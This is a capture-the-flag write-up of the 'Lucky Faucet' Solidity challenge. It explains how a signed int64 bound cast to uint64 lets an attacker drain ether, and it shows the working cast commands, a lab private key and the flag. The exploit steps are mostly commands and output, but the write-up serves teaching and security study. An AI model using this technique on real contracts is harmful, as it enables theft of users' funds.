---
title: "Lucky Faucet - Cyber Apocalypse 2024: Hacker Royale"
category: "blockchain"
subcategory: "smart-contract"
type: "writeup"
tags: ["blockchain", "solidity", "foundry", "lucky", "faucet", "smart-contract", "cyber-apocalypse-2024-hacker-r", "cyber-apocalypse-2024-hacker-royal", "2024", "ctf-writeup"]
summary: "We are given a Solidity file called LuckyFaucet.sol:"
source:
  name: "CTFtime writeup #38996"
  url: "https://ctftime.org/writeup/38996"
original_source: "https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/lucky-faucet/"
ctf:
  name: "Cyber Apocalypse 2024: Hacker Royale"
  year: 2024
  challenge: "Lucky Faucet"
---

## Metadata

- **CTF:** Cyber Apocalypse 2024: Hacker Royale
- **Task:** Lucky Faucet
- **Author team:** Watch4Hack
- **CTFtime:** <https://ctftime.org/writeup/38996>
- **Original writeup:** <https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/lucky-faucet/>

---
We are given a Solidity file called `LuckyFaucet.sol`:

`

```
    // SPDX-License-Identifier: MIT
    pragma solidity 0.7.6;
    
    contract LuckyFaucet {
        int64 public upperBound;
        int64 public lowerBound;
    
        constructor() payable {
            // start with 50M-100M wei Range until player changes it
            upperBound = 100_000_000;
            lowerBound =  50_000_000;
        }
    
        function setBounds(int64 _newLowerBound, int64 _newUpperBound) public {
            require(_newUpperBound <= 100_000_000, "100M wei is the max upperBound sry");
            require(_newLowerBound <=  50_000_000,  "50M wei is the max lowerBound sry");
            require(_newLowerBound <= _newUpperBound);
            // why? because if you don't need this much, pls lower the upper bound :)
            // we don't have infinite money glitch.
            upperBound = _newUpperBound;
            lowerBound = _newLowerBound;
        }
    
        function sendRandomETH() public returns (bool, uint64) {
            int256 randomInt = int256(blockhash(block.number - 1)); // "but it's not actually random 🤓"
            // we can safely cast to uint64 since we'll never 
            // have to worry about sending more than 2**64 - 1 wei 
            uint64 amountToSend = uint64(randomInt % (upperBound - lowerBound + 1) + lowerBound); 
            bool sent = msg.sender.send(amountToSend);
            return (sent, amountToSend);
        }
    }
```

`

Moreover, we have this `Setup.sol`, which is common in Solidity challenges:

`

```
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity 0.7.6;
    
    import {LuckyFaucet} from "./LuckyFaucet.sol";
    
    contract Setup {
        LuckyFaucet public immutable TARGET;
    
        uint256 constant INITIAL_BALANCE = 500 ether;
    
        constructor() payable {
            TARGET = new LuckyFaucet{value: INITIAL_BALANCE}();
        }
    
        function isSolved() public view returns (bool) {
            return address(TARGET).balance <= INITIAL_BALANCE - 10 ether;
        }
    }
```

`

Here we see that the remote instance has deployed a `LuckyFaucet` Smart Contract with `500 ether`, and we will solve the challenge if the Smart Contract has less than `490 ether`.

## Solidity version

Once thing to notice, compared to [Russian Roulette](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/russian-roulette), is that these Smart Contract use a especific Solidity version, which is 0.7.6. In the rest of the challenges, they were using up-to-date versions. Obviously, this will be key to solve the challenge.

In fact, this version has some security issues and does not throw any exception if integer operations are not working as expected. For instance, it does not care about integer underflow/overflow (more information at [www.halborn.com](https://www.halborn.com/blog/post/arithmetic-underflow-and-overflow-vulnerabilities-in-solidity)).

## Exploitation

Notice that the Smart Contract will send us balance with `sendRandomETH`:

`

```
        function sendRandomETH() public returns (bool, uint64) {
            int256 randomInt = int256(blockhash(block.number - 1)); // "but it's not actually random 🤓"
            // we can safely cast to uint64 since we'll never 
            // have to worry about sending more than 2**64 - 1 wei 
            uint64 amountToSend = uint64(randomInt % (upperBound - lowerBound + 1) + lowerBound); 
            bool sent = msg.sender.send(amountToSend);
            return (sent, amountToSend);
        }
```

`

But we will receive between `50_000_000 wei` and `100_000_000 wei`. These values, converted to `ether` are insignificant (see [eth-converter.com](https://eth-converter.com/)), and we need to take at least `10 ether` from the Smart Contract, which is `10_000_000_000_000_000_000 wei`.

But we can change the upper and lower bounds:

`

```
        function setBounds(int64 _newLowerBound, int64 _newUpperBound) public {
            require(_newUpperBound <= 100_000_000, "100M wei is the max upperBound sry");
            require(_newLowerBound <=  50_000_000,  "50M wei is the max lowerBound sry");
            require(_newLowerBound <= _newUpperBound);
            // why? because if you don't need this much, pls lower the upper bound :)
            // we don't have infinite money glitch.
            upperBound = _newUpperBound;
            lowerBound = _newLowerBound;
        }
```

`

Notice that the value types are `int64`, so they are considering signed integers. As a result, we can use negative numbers. In contrast, `sendRandomETH` does a conversion to `uint64`, which is unsigned.

As a result, due to the fact that negative integers, when interpreted as unsigned values have the most significant bit set to `1`, we can just enter a negative value in the lower bound and thus `amountToSend` will be huge.

For instance, `0xffffffffffffffff` is `-1` as an unsigned integer (hexadecimal format). In decimal, `-1` is `18446744073709551615`, which corresponds to `18.44... ether`. This is enough to solve the challenge. Therefore, we will set the lower bound to `-100_000_000 wei`, so that the integer that is converted to `uint64` is negative.

First of all, let’s take the connection parameters:

`

```
    $ nc 94.237.62.99 32310
    1 - Connection information
    2 - Restart Instance
    3 - Get flag
    action? 1
    
    Private key     :  0x602db1859c61350ed8dbc24e52c9a078d59a381921e3197a40765991a80424e0
    Address         :  0x92D5203299F8a4A7fF602eD38B4F3b714D11e40A
    Target contract :  0x4040c02cf70d0F5b82C0bf217F48b97050cEC397
    Setup contract  :  0xCBAeC91B55c8CDEe3D6c6f532D061A25b5A10d8A
    ^C
    
    $ PRIVATE_KEY='0x602db1859c61350ed8dbc24e52c9a078d59a381921e3197a40765991a80424e0'
    
    $ ADDRESS_TARGET='0x4040c02cf70d0F5b82C0bf217F48b97050cEC397'
    
    $ ADDRESS_SETUP='0xCBAeC91B55c8CDEe3D6c6f532D061A25b5A10d8A'
    
    $ export ETH_RPC_URL='http://94.237.62.99:30189'
```

`

Now we are ready to use `cast`:

`

```
    $ cast call $ADDRESS_SETUP 'isSolved() (bool)'
    false
```

`

So, let’s update the lower bound and set `-100000000`:

`

```
    $ cast send --private-key $PRIVATE_KEY $ADDRESS_TARGET 'setBounds(int64, int64)' -- '-100000000' '100000000'
    
    blockHash               0x8967f6cd7419c6928342ea7b89daf57fb9a7bd4ed65dbee112749e8e0a992544
    blockNumber             2
    contractAddress
    cumulativeGasUsed       27147
    effectiveGasPrice       3000000000
    from                    0x92D5203299F8a4A7fF602eD38B4F3b714D11e40A
    gasUsed                 27147
    logs                    []
    logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    root
    status                  1
    transactionHash         0xf39ee23b09692cb73f8c113a5d0e0b069d08d7888b72f3140c7d99a9200e1ada
    transactionIndex        0
    type                    2
    to                      0x4040…c397
    depositNonce             null
```

`

We can check that it has changed:

`

```
    $ cast call $ADDRESS_TARGET 'lowerBound() (int64)'
    -100000000
```

`

Now, we are ready to use `sendRandomETH`:

`

```
    $ cast balance --ether $ADDRESS_TARGET
    500.000000000000000000
    
    $ cast send $ADDRESS_TARGET 'sendRandomETH()' --private-key $PRIVATE_KEY
    
    blockHash               0xb00d68ca8f507e4f52ac9dfe583d0da9e7b073bb5d57ee0fb665309c54bdf24f
    blockNumber             3
    contractAddress
    cumulativeGasUsed       30463
    effectiveGasPrice       3000000000
    from                    0x92D5203299F8a4A7fF602eD38B4F3b714D11e40A
    gasUsed                 30463
    logs                    []
    logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    root
    status                  1
    transactionHash         0x47c98d6906a29d1df1422a4b4c8628423173d793965f19949af7a4e074cdd02b
    transactionIndex        0
    type                    2
    to                      0x4040…c397
    depositNonce             null
    
    $ cast balance --ether $ADDRESS_TARGET
    481.553255926586234658
```

`

As can be seen, we have taken more than `10 ether` from the Smart Contract, so the challenge is solved:

`

```
    $ cast call $ADDRESS_SETUP 'isSolved() (bool)'
    true
```

`

## Flag

And this is the flag:

`

```
    $ nc 94.237.62.99 32310
    1 - Connection information
    2 - Restart Instance
    3 - Get flag
    action? 3
    HTB{1_f0rg0r_s0m3_U}
```

`
